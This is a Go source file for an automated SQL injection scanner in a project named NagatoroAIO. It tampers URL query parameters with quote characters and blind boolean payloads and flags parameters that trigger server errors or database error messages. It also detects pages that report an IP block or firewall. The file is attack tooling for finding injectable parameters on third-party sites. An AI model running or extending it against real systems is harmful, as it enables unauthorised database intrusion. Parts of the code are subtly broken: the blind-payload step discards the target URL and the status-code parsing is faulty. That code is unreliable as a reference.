package dumper

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/courtier/NagatoroAIO/logger"
	"github.com/courtier/NagatoroAIO/utils"
)

var (
	//prefix/suffix values used for building testing blind payloads
	prefixes []string = []string{" ", ") ", "' ", "') "}
	suffixes []string = []string{"", "-- -", "#", "%%16"}
	//characters used for SQL tampering/poisoning of parameter values
	tamperSQLCharPool []string = []string{"(", ")", "'", "\"", "')", "';", "\"", "\")", "\";", "`", "`)", "`;", "\\"}
	//boolean tests used for buildinng testing blind payloads
	booleanTests []string = []string{"AND %d=%d", "OR NOT (%d>%d)"}
	//regex used for recogintion of generic firewall messaages
	blockedIPRegex *regexp.Regexp = regexp.MustCompile("(?i)(\\A|\\b)IP\\b.*\\b(banned|blocked|bl(a|o)ck\\s?list|firewall)")
	//regex for param value
	paramValueRegex *regexp.Regexp = regexp.MustCompile("(=)(.*?)(\\&|$)")
	//html title regex
	titleRegex *regexp.Regexp = regexp.MustCompile("(?i)<title>(.*?)</title>")
	//html script regex
	scriptRegex *regexp.Regexp = regexp.MustCompile("(?i)<script>(.*?)</script>")
	//html style regex
	styleRegex *regexp.Regexp = regexp.MustCompile("(?i)<style>(.*?)</style>")
)

func retrieveContent(requestURL string, client *http.Client) map[string]string {
	result := make(map[string]string, 3)
	if !strings.Contains(requestURL, "?") {
		return result
	}
	resp, err := client.Get(requestURL)
	if err != nil {
		return result
	}
	defer resp.Body.Close()
	result["status"] = resp.Status
	body, err := ioutil.ReadAll(resp.Body)
	content := string(body)
	if err != nil {
		return result
	}
	if content == "" {
		return result
	}
	title := titleRegex.FindString(content)
	title = strings.ReplaceAll(strings.ReplaceAll(title, "<title>", ""), "</title>", "")
	result["title"] = title
	if blockedIPRegex.MatchString(content) {
		return result
	}
	content = scriptRegex.ReplaceAllLiteralString(content, "")
	content = styleRegex.ReplaceAllLiteralString(content, "")
	result["content"] = content
	return result
}

func scanURL(checkURL string, client *http.Client, ch chan map[string]interface{}) {
	result := make(map[string]interface{}, 3)
	result["url"] = checkURL
	result["vulnerable"] = false
	paramValues := paramValueRegex.FindAllStringIndex(checkURL, -1)
	if len(paramValues) < 1 {
		ch <- result
		return

	}
	originalContent := retrieveContent(checkURL, client)
	if originalContent["status"] == "" {
		ch <- result
		return
	}
	for _, paramValue := range paramValues {
		if paramValue[1]-paramValue[0] > 2 {
			logger.LogDebug("scanning param value", checkURL[paramValue[0]:paramValue[1]])
			tamperChar := randElement(&tamperSQLCharPool)
			newURL := checkURL[:paramValue[0]+1] + tamperChar + checkURL[paramValue[1]-1:]
			paramValueString := checkURL[paramValue[0]:paramValue[1]]
			logger.LogDebug(newURL)
			newContent := retrieveContent(newURL, client)
			if newContent["status"] == "" {
				continue
			}
			result = checkContents(originalContent, newContent, checkURL, paramValueString, tamperChar)
			if !result["vulnerable"].(bool) {
				injectionCartesianProducts := utils.Iter([][]string{prefixes, booleanTests, suffixes})
				for injectionProductInterface := range injectionCartesianProducts {
					injectionProduct := utils.InterfaceArrToStringArr(injectionProductInterface)
					template := fmt.Sprintf("%s%s%s", injectionProduct[0], injectionProduct[1], injectionProduct[2]) //.replace(" " if inline_comment else "/**/", "/**/")
					newURL = url.QueryEscape(template)
					newContent = retrieveContent(newURL, client)
					result = checkContents(originalContent, newContent, checkURL, paramValueString, template)
					if result["vulnerable"].(bool) {
						ch <- result
						return

					}
				}
			} else {
				ch <- result
				return
			}
		}
	}
	ch <- result
	return

}

func checkContents(prevContent, currContent map[string]string, scannedURL, paramValueString, injectedPayload string) map[string]interface{} {
	result := make(map[string]interface{}, 5)
	result["vulnerable"] = false
	result["url"] = scannedURL
	if currContent["status"] != "" {
		code := 0
		if len(currContent["status"]) < 4 {
			tempCode, err := strconv.Atoi(currContent["status"])
			if err != nil {
				return result
			}
			code = tempCode
		} else {
			code, _ = strconv.Atoi(currContent["status"][:4])
		}
		if code >= 500 {
			fmt.Println(prevContent["status"])
			fmt.Println(currContent["status"])
			result["vulnerable"] = true
			result["url"] = scannedURL
			result["paramValue"] = paramValueString
			result["dbms"] = "unknown"
			result["payload"] = injectedPayload
			return result
		}
	}
	if !result["vulnerable"].(bool) {
		for dbms, dbmsRegexes := range dbmsErrors {
			for _, dbmsRegex := range dbmsRegexes {
				if dbmsRegex.MatchString(currContent["content"]) {
					result["vulnerable"] = true
					result["url"] = scannedURL
					result["paramValue"] = paramValueString
					result["dbms"] = dbms
					result["payload"] = injectedPayload
					return result
				}
			}
		}
	}
	return result
}

func randElement(arr *[]string) string {
	rand.Seed(time.Now().Unix())
	return (*arr)[rand.Intn(len(*arr))]

}
